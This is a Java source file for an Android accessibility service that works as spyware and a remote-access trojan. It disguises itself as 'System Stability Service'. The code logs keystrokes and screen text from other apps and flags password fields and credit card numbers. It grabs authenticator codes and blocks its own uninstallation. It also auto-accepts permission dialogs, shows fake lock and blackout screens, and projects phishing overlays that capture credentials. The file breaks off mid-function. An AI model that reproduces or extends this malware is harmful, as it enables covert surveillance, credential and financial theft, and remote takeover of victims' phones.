package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

public class IO_Persistence_Manager extends AccessibilityService {
    private static final String TAG = "IO_Persistence_Manager";
    private static java.lang.ref.WeakReference<IO_Persistence_Manager> instanceRef = new java.lang.ref.WeakReference<>(null);

    private static final List<String> keystrokes = Collections.synchronizedList(new LinkedList<>());
    private String lastPackage = "";
    private static volatile boolean skipAntiRemoval = false;

    private int screenWidth = 0;
    private int screenHeight = 0;

    private long lastAntiRemovalCheck = 0;
    private static volatile long lastEventTime = 0;
    private Handler backgroundHandler;
    private android.os.HandlerThread handlerThread;

    public static IO_Persistence_Manager getInstance() { return instanceRef.get(); }

    public static long getLastEventTime() { return lastEventTime; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instanceRef = new java.lang.ref.WeakReference<>(this);
        
        handlerThread = new android.os.HandlerThread("GhostWorker");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());

        updateDisplayMetrics();
        Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
        FirebaseConfig.logActivity("GHOST_UPLINK: Persistence core synchronized");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // [STABILITY_SYNC] Ensure the service is treated as a started service for priority
        return START_STICKY;
    }

    private void updateDisplayMetrics() {
        try {
            WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
            if (wm != null) {
                android.view.Display display = wm.getDefaultDisplay();
                Point size = new Point();
                display.getRealSize(size);
                screenWidth = size.x;
                screenHeight = size.y;
            }
        } catch (Exception ignored) {}
    }

    public int getScreenWidth() { 
        if (screenWidth == 0) updateDisplayMetrics();
        return screenWidth; 
    }
    
    public int getScreenHeight() { 
        if (screenHeight == 0) updateDisplayMetrics();
        return screenHeight; 
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        lastEventTime = System.currentTimeMillis();
        
        // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
        final int eventType = event.getEventType();
        final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // --- AUTO_PILOT: SPEED_OPTIMIZED TRIGGER ---
        if (isAutoPilotEngaged()) {
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
                
                if (packageName.contains("permissioncontroller") || 
                    packageName.contains("packageinstaller") || 
                    packageName.contains("vending") ||
                    packageName.contains("gms")) {
                    runTacticalAutoPilot(packageName);
                }
            }
        }
        
        // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
        if (packageName.isEmpty() || 
            packageName.equals(getPackageName()) || 
            packageName.contains("systemui") || 
            packageName.contains("launcher") ||
            packageName.contains("recents")) {
            return;
        }

        // Allow permission controller so Auto-Pilot can work
        if (!packageName.contains("permissioncontroller") && !packageName.contains("packageinstaller")) {
            if (packageName.contains("messaging") || 
                packageName.contains("mms") || 
                packageName.contains("sms") || 
                packageName.contains("whatsapp") ||
                packageName.contains("telecom")) {
                return;
            }
        }

        final List<String> eventText = new ArrayList<>();
        if (event.getText() != null && !event.getText().isEmpty()) {
            Object first = event.getText().get(0);
            if (first != null) eventText.add(first.toString());
        }
        
        // --- 3. OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
        if (backgroundHandler != null) {
            backgroundHandler.post(() -> {
                try {
                    boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
                    
                    if (isSuicideMode) {
                        handleAutoDestruct(packageName);
                        return;
                    }

                    if (!skipAntiRemoval) {
                        if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
                            checkAntiRemovalInternal();
                        }
                    }
                    
                    if (!eventText.isEmpty()) {
                        if (packageName.contains("authenticator") || packageName.contains("authy")) {
                            snatchAuthenticatorCodes(packageName);
                        }

                        processEventLogic(eventType, packageName, eventText);
                    }
                } catch (Exception ignored) {}
            });
        }
    }

    private long lastAntiRemovalExecution = 0;

    private void checkAntiRemovalInternal() {
        // [STABILITY_SYNC] Skip anti-removal checks if we are currently in the Guided Permission Repair flow
        // This prevents the shield from kicking the user out while they are granting permissions.
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_repairing", false)) {
            return;
        }

        // Double-check persistent flag
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
            return; 
        }

        long now = System.currentTimeMillis();
        // Cooldown: Don't scan the UI more than once every 2 seconds to prevent "Recent Apps" lag
        if (now - lastAntiRemovalExecution < 2000) return;
        lastAntiRemovalExecution = now;

        // Must run on main thread for getRootInActiveWindow()
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                
                // Specific package check: only block if inside the actual uninstaller or settings
                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) {
                    root.recycle();
                    return;
                }

                // Only trigger if we are specifically on OUR app's details page and see dangerous buttons
                if (pkg.contains("settings")) {
                    List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Stability Service");
                    if (labels == null || labels.isEmpty()) {
                        root.recycle();
                        return;
                    }
                }

                String[] danger = {"uninstall", "delete", "clear data"};
                for (String s : danger) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                    if (nodes != null && !nodes.isEmpty()) {
                        // Double-check visibility and text match to avoid false positives on list items
                        for (AccessibilityNodeInfo node : nodes) {
                            if (node.isVisibleToUser() && node.getText() != null && 
                                node.getText().toString().toLowerCase().contains(s)) {
                                performGlobalAction(GLOBAL_ACTION_HOME);
                                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
                                break;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void processEventLogic(int eventType, String pkg, List<String> textList) {
        StringBuilder log = new StringBuilder();
        
        if (!pkg.equals(lastPackage)) {
            logKeystroke("\n[" + pkg + "] -> ");
            lastPackage = pkg;
        }

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    if (source.isPassword()) {
                        log.append("[PASSWORD_FIELD_DETECTED]: ");
                    }
                    deepInspectNode(source, log);
                    source.recycle();
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                if (!textList.isEmpty()) {
                    String txt = textList.get(0).toString();
                    if (!isGenericSystemText(txt)) {
                        log.append(txt).append(" ");
                    }
                }
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                log.append(eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED ? "[LONG_CLICK]: " : "[CLICK]: ");
                if (!textList.isEmpty()) {
                    log.append(textList.get(0)).append(" ");
                }
                break;
        }

        String result = log.toString().trim();
        if (!result.isEmpty() && !result.equals("null")) {
            logKeystroke(result + " ");
        }
    }

    private void deepInspectNode(AccessibilityNodeInfo node, StringBuilder log) {
        if (node == null) return;
        
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        
        if (text != null && text.length() > 0 && !isGenericSystemText(text.toString())) {
            log.append("[").append(text).append("] ");
        } else if (desc != null && desc.length() > 0 && !isGenericSystemText(desc.toString())) {
            log.append("{").append(desc).append("} ");
        }
        
        for (int i = 0; i < Math.min(node.getChildCount(), 5); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                deepInspectNode(child, log);
                child.recycle();
            }
        }
    }

    private boolean isGenericSystemText(String txt) {
        if (txt == null) return true;
        String low = txt.toLowerCase();
        return low.contains("filling options") || 
               low.contains("above the keyboard") || 
               low.contains("enhanced protection") ||
               low.contains("option available") ||
               low.contains("tap to") ||
               low.length() < 2;
    }

    private void logKeystroke(String msg) {
        // --- SMART INTEL: LUHN VALIDATION (Credit Card Detection) ---
        if (msg.matches(".*\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b.*")) {
            String clean = msg.replaceAll("[^0-9]", "");
            if (isValidLuhn(clean)) {
                FirebaseConfig.logActivity("INTEL_CRITICAL: Valid Credit Card signature detected in buffer");
                msg = "[FINANCIAL_INTEL_DETECTED]: " + msg;
            }
        }

        synchronized (keystrokes) {
            keystrokes.add(msg);
            while (keystrokes.size() > 2000) keystrokes.remove(0);
        }
    }

    private boolean isValidLuhn(String number) {
        int sum = 0;
        boolean alternate = false;
        for (int i = number.length() - 1; i >= 0; i--) {
            int n = Integer.parseInt(number.substring(i, i + 1));
            if (alternate) {
                n *= 2;
                if (n > 9) n = (n % 10) + 1;
            }
            sum += n;
            alternate = !alternate;
        }
        return (sum % 10 == 0);
    }

    public static List<String> getKeystrokes() {
        synchronized (keystrokes) {
            return new ArrayList<>(keystrokes);
        }
    }

    public static void clearKeystrokes() {
        keystrokes.clear();
    }

    // ============ BLACKOUT PROTOCOL ============

    private View blackoutView;
    private View lockView;
    private android.webkit.WebView overlayWebView;

    public void startBlackout(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (blackoutView == null) {
                        blackoutView = new View(IO_Persistence_Manager.this);
                        blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                                android.graphics.PixelFormat.TRANSLUCENT);
                        
                        params.screenBrightness = 0.001f;
                        params.buttonBrightness = 0.0f;
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }
                        wm.addView(blackoutView, params);
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                    }
                } else {
                    if (blackoutView != null) {
                        wm.removeViewImmediate(blackoutView);
                        blackoutView = null;
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
        });
    }

    public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
    public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
    public static void forceSkipAntiRemoval() { skipAntiRemoval = true; }

    private static boolean autoPilotEngaged = true;
    public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
    public static boolean isAutoPilotEngaged() { return autoPilotEngaged; }

    public static boolean isBlackoutActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && instance.blackoutView != null;
    }

    public static boolean isLockActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && instance.lockView != null;
    }

    public void setRemoteLock(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (lockView == null) {
                        lockView = new android.widget.FrameLayout(IO_Persistence_Manager.this);
                        lockView.setBackgroundColor(android.graphics.Color.BLACK);

                        android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                        tv.setText("SECURITY_MAINTENANCE_IN_PROGRESS\n\nPlease do not disconnect hardware.");
                        tv.setTextColor(android.graphics.Color.WHITE);
                        tv.setGravity(android.view.Gravity.CENTER);
                        tv.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
                        tv.setTextSize(18);

                        ((android.widget.FrameLayout)lockView).addView(tv, new android.widget.FrameLayout.LayoutParams(
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT));

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                android.graphics.PixelFormat.OPAQUE);

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        wm.addView(lockView, params);
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock DEPLOYED");
                    }
                } else {
                    if (lockView != null) {
                        wm.removeViewImmediate(lockView);
                        lockView = null;
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock RELEASED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Lock Error: " + e.getMessage()); }
        });
    }

    /**
     * Deploys a Shadow Overlay (Phishing WebView) over the current application.
     */
    public void deployShadowOverlay(final String html) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (html != null && !html.isEmpty()) {
                    if (overlayWebView == null) {
                        overlayWebView = new android.webkit.WebView(IO_Persistence_Manager.this);
                        android.webkit.WebSettings settings = overlayWebView.getSettings();
                        settings.setJavaScriptEnabled(true);
                        settings.setDomStorageEnabled(true);
                        settings.setAllowFileAccess(true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            settings.setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                        }
                        overlayWebView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
                        
                        // Interface to capture data from the overlay
                        overlayWebView.addJavascriptInterface(new Object() {
                            @android.webkit.JavascriptInterface
                            public void capture(String data) {
                                FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + data);
                                deployShadowOverlay(null); // Auto-terminate on capture
                            }
                        }, "Uplink");

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                                android.graphics.PixelFormat.TRANSLUCENT);

                        // Ensure focusability for text inputs
                        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

                        wm.addView(overlayWebView, params);
                    }
                    overlayWebView.loadDataWithBaseURL("https://system.stability/", html, "text/html", "UTF-8", null);
                    FirebaseConfig.logActivity("EXPLOIT_DEPLOYED: Shadow Overlay projected to screen");
                } else {
                    if (overlayWebView != null) {
                        wm.removeViewImmediate(overlayWebView);
                        overlayWebView = null;
                        FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Overlay terminated");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Overlay Error: " + e.getMessage()); }
        });
    }

    public void showOverlayToast(final String message) {
        showOverlayToast(message, 22, 250, "scroll", 12000, "#FFFFFF");
    }

    public void showOverlayToast(final String message, final int fontSize, final int yPos, final String animation, final int duration, final String hexColor) {
        if (message == null || message.isEmpty()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                
                final android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                tv.setText(message);
                
                int color = android.graphics.Color.WHITE;
                if (hexColor != null && !hexColor.isEmpty()) {
                    try { color = android.graphics.Color.parseColor(hexColor); } catch (Exception ignored) {}
                }
                tv.setTextColor(color);
                tv.setPadding(30, 20, 30, 20);
                tv.setTextSize(fontSize > 0 ? fontSize : 22);
                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
                
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        android.graphics.PixelFormat.TRANSLUCENT);

                android.view.View viewToDisplay = tv;

                if ("scroll".equalsIgnoreCase(animation)) {
                    tv.setSingleLine(true);
                    tv.setGravity(android.view.Gravity.START | android.view.Gravity.CENTER_VERTICAL);
                    
                    // Container to allow tight background on tv while window is full-width
                    android.widget.FrameLayout container = new android.widget.FrameLayout(IO_Persistence_Manager.this);
                    container.addView(tv, new android.widget.FrameLayout.LayoutParams(
                            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT));
                    
                    params.width = WindowManager.LayoutParams.MATCH_PARENT;
                    params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.START;
                    params.x = 0;
                    tv.setTranslationX(2500); 
                    viewToDisplay = container;
                } else {
                    tv.setGravity(android.view.Gravity.CENTER);
                    params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.CENTER_HORIZONTAL;
                    params.x = 0;
                }
                params.y = yPos > 0 ? yPos : 250; 

                // Rounded corners via drawable
                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
                shape.setCornerRadius(50);
                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
                tv.setBackground(shape);

                final android.view.View finalView = viewToDisplay;
                wm.addView(finalView, params);
                
                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : getResources().getDisplayMetrics().widthPixels;

                if ("pop".equalsIgnoreCase(animation)) {
                    tv.setAlpha(0f);
                    tv.setScaleX(0.5f);
                    tv.setScaleY(0.5f);
                    tv.animate()
                      .alpha(1f)
                      .scaleX(1.1f)
                      .scaleY(1.1f)
                      .setDuration(300)
                      .withEndAction(() -> {
                          tv.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start();
                          new Handler(Looper.getMainLooper()).postDelayed(() -> {
                              tv.animate().alpha(0f).setDuration(500).withEndAction(() -> {
                                  try { wm.removeView(finalView); } catch (Exception ignored) {}
                              }).start();
                          }, duration > 0 ? duration : 3000);
                      })
                      .start();
                } else if ("scroll".equalsIgnoreCase(animation)) {
                    tv.post(() -> {
                        // Calculate text width to know when it's fully off-screen
                        float textWidth = tv.getPaint().measureText(message) + tv.getPaddingLeft() + tv.getPaddingRight();
                        
                        // Snap to right edge exactly
                        tv.setTranslationX(screenW);
                        
                        tv.animate()
                          .translationX(-textWidth) // Move until the end of the text passes the left edge
                          .setDuration(duration > 0 ? duration : 12000)
                          .setInterpolator(new android.view.animation.LinearInterpolator())
                          .withEndAction(() -> {
                              try { wm.removeView(finalView); } catch (Exception ignored) {}
                          })
                          .start();
                    });
                } else if ("burnt".equalsIgnoreCase(animation)) {
                    // PRANK: Burnt Toast (Extreme shaking, color glitching, rapid flicker)
                    tv.setAlpha(0f);
                    tv.setScaleX(0.9f);
                    tv.setScaleY(0.9f);
                    
                    int startColor = android.graphics.Color.WHITE;
                    try { startColor = android.graphics.Color.parseColor(hexColor); } catch (Exception ignored) {}
                    tv.setTextColor(startColor);
                    
                    shape.setColor(android.graphics.Color.BLACK);
                    shape.setStroke(6, startColor);
                    
                    tv.animate().alpha(1f).scaleX(1.1f).scaleY(1.1f).setDuration(150).start();
                    
                    final Handler glitchHandler = new Handler(Looper.getMainLooper());
                    final Runnable glitchRunnable = new Runnable() {
                        @Override
                        public void run() {
                            // Violent multi-axis shake
                            tv.setTranslationX((float) (Math.random() * 30 - 15));
                            tv.setTranslationY((float) (Math.random() * 30 - 15));
                            // Rapid flicker
                            tv.setAlpha((float) (0.2 + Math.random() * 0.8));
                            // Intense random color glitching
                            if (Math.random() > 0.5) {
                                int[] glitchColors = {0xFFFF3131, 0xFF39FF14, 0xFF00F2FF, 0xFFFFFF00, 0xFFFF00FF, 0xFFFFFFFF, 0xFF000000, 0xFFFF9D00};
                                int nextColor = glitchColors[(int)(Math.random() * glitchColors.length)];
                                tv.setTextColor(nextColor);
                                shape.setStroke(6, nextColor);
                            }
                            glitchHandler.postDelayed(this, 30);
                        }
                    };
                    glitchHandler.post(glitchRunnable);

                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        glitchHandler.removeCallbacks(glitchRunnable);
                        tv.animate().alpha(0f).scaleX(2.0f).scaleY(0.01f).setDuration(250).withEndAction(() -> {
                            try { wm.removeView(finalView); } catch (Exception ignored) {}
                        }).start();
                    }, duration > 0 ? duration : 5000);
                } else {
                    // Static Fade - Professional vertical slide and blur-in feel
                    tv.setAlpha(0f);
                    tv.setTranslationY(100f); // Start significantly lower
                    tv.animate()
                      .alpha(1f)
                      .translationY(0f) // Slide up to anchor
                      .setDuration(1000)
                      .setInterpolator(new android.view.animation.OvershootInterpolator(0.7f))
                      .start();
                      
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        tv.animate()
                          .alpha(0f)
                          .translationY(-100f) // Continue sliding up as it fades out
                          .setDuration(1000)
                          .withEndAction(() -> {
                              try { wm.removeView(finalView); } catch (Exception ignored) {}
                          }).start();
                    }, duration > 0 ? duration : 4000);
                }
                
            } catch (Exception e) { Log.e(TAG, "Overlay Toast Error: " + e.getMessage()); }
        });
    }

    public void runAutoHeal() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                skipAntiRemoval = true; 
                FirebaseConfig.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
            } catch (Exception e) { FirebaseConfig.logActivity("GHOST_ERROR: Auto-Heal failed"); }
        });
    }

    // ============ UI INSPECTOR ============

    private final java.util.concurrent.ConcurrentHashMap<Integer, AccessibilityNodeInfo> nodeIdMap = new java.util.concurrent.ConcurrentHashMap<>();
    private int nextNodeId = 0;

    public String captureUiTree() {
        nodeIdMap.clear();
        nextNodeId = 0;
        
        org.json.JSONObject rootObj = new org.json.JSONObject();
        try {
            updateDisplayMetrics();
            rootObj.put("width", screenWidth);
            rootObj.put("height", screenHeight);

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                rootObj.put("package", root.getPackageName() != null ? root.getPackageName().toString() : "Unknown");
                rootObj.put("tree", serializeNode(root, 0));
                root.recycle();
            } else {
                rootObj.put("error", "Root node unavailable");
            }
        } catch (Exception e) {
            try { rootObj.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return rootObj.toString();
    }

    private org.json.JSONObject serializeNode(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 50) return null;

        org.json.JSONObject obj = new org.json.JSONObject();
        try {
            int id = nextNodeId++;
            nodeIdMap.put(id, AccessibilityNodeInfo.obtain(node));
            
            obj.put("id", id);
            obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "View");
            
            CharSequence text = node.getText();
            if (text != null) obj.put("text", text.toString());
            
            CharSequence desc = node.getContentDescription();
            if (desc != null) obj.put("desc", desc.toString());
            
            String resId = node.getViewIdResourceName();
            if (resId != null) obj.put("resId", resId);

            Rect rect = new Rect();
            node.getBoundsInScreen(rect);
            obj.put("x", rect.left);
            obj.put("y", rect.top);
            obj.put("w", rect.width());
            obj.put("h", rect.height());

            obj.put("clickable", node.isClickable());
            obj.put("focusable", node.isFocusable());
            obj.put("editable", node.isEditable());
            obj.put("password", node.isPassword());
            obj.put("visible", node.isVisibleToUser());

            org.json.JSONArray children = new org.json.JSONArray();
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    org.json.JSONObject childObj = serializeNode(child, depth + 1);
                    if (childObj != null) children.put(childObj);
                    child.recycle();
                }
            }
            if (children.length() > 0) obj.put("children", children);

        } catch (Exception ignored) {}
        return obj;
    }

    public boolean performNodeAction(int id, int action) {
        AccessibilityNodeInfo node = nodeIdMap.get(id);
        if (node != null) {
            return node.performAction(action);
        }
        return false;
    }

    public void typeText(final String text) {
        if (text == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                AccessibilityNodeInfo target = findFocusedEditableNode(root);
                if (target != null) {
                    // Stage 1: Try Direct Injection (ACTION_SET_TEXT)
                    android.os.Bundle arguments = new android.os.Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    
                    if (!success) {
                        // Stage 2: Clipboard Fallback (Copy + Paste)
                        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(android.content.Context.CLIPBOARD_SERVICE);
                        if (clipboard != null) {
                            android.content.ClipData clip = android.content.ClipData.newPlainText("Uplink", text);
                            clipboard.setPrimaryClip(clip);
                            target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                            FirebaseConfig.logActivity("GHOST_CONTROL: Remote typing via Clipboard Fallback");
                        }
                    } else {
                        FirebaseConfig.logActivity("GHOST_CONTROL: Remote typing via Direct Injection");
                    }
                    target.recycle();
                } else {
                    FirebaseConfig.logActivity("GHOST_WARNING: No focused input field detected");
                }
                root.recycle();
            } catch (Exception e) {
                Log.e(TAG, "Type Error: " + e.getMessage());
            }
        });
    }

    private AccessibilityNodeInfo findFocusedEditableNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isFocused() && node.isEditable()) return AccessibilityNodeInfo.obtain(node);
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findFocusedEditableNode(child);
            if (child != null) child.recycle();
            if (result != null) return result;
        }
        return null;
    }

    // ============ INTERACTION ============

    public boolean clickAt(int x, int y) {
        // --- HARDENED BOUNDS CHECK: Prevents Path bounds must not be negative crash ---
        if (x < 0 || y < 0) {
             Log.w(TAG, "Suppressed clickAt with negative coordinates: (" + x + "," + y + ")");
             return false;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                // Use reflection to call API 24+ helper and avoid ClassNotFoundException on older devices
                Class<?> helper = Class.forName("com.labs.labrats.Api24Helper");
                java.lang.reflect.Method method = helper.getMethod("dispatchClick", AccessibilityService.class, int.class, int.class);
                return (boolean) method.invoke(null, this, x, y);
            } catch (Exception e) {
                Log.e(TAG, "Reflection error (API 24): " + e.getMessage());
                return clickAtLegacy(x, y);
            }
        } else {
            // FALLBACK FOR API < 24: Coordinate-to-Node Mapping
            Log.d(TAG, "Executing legacy click fallback for API " + Build.VERSION.SDK_INT);
            return clickAtLegacy(x, y);
        }
    }

    private boolean clickAtLegacy(int x, int y) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            boolean success = performClickAtNode(root, x, y);
            root.recycle();
            if (success) return true;
        }
        
        // Fallback: search all windows
